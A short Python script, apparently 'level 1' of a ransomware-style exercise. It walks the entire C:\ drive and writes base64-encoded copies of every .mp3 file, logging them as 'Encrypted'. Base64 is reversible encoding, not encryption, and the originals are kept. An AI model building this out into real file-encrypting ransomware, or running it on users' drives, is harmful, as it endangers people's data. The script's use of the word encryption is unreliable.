#level1
import os
import base64

def log(msg):
    print(f"[+] {msg}")

def is_already_encrypted(file_path):
    return file_path.endswith(".b64") or os.path.exists(file_path + ".b64")

def encrypt_file_base64(file_path):
    try:
        with open(file_path, "rb") as f:
            raw_data = f.read()

        encoded_data = base64.b64encode(raw_data)
        new_path = file_path + ".b64"

        with open(new_path, "wb") as f:
            f.write(encoded_data)

        log(f"Encrypted: {file_path}")
    except Exception as e:
        log(f"Error: {file_path} -> {e}")

def scan_and_encrypt_mp3(start_path="C:\\"):
    log("Scanning for .mp3 files...")
    for root, dirs, files in os.walk(start_path):
        for file in files:
            if file.lower().endswith(".mp3"):
                full_path = os.path.join(root, file)
                if not is_already_encrypted(full_path):
                    encrypt_file_base64(full_path)

if __name__ == "__main__":
    scan_and_encrypt_mp3()
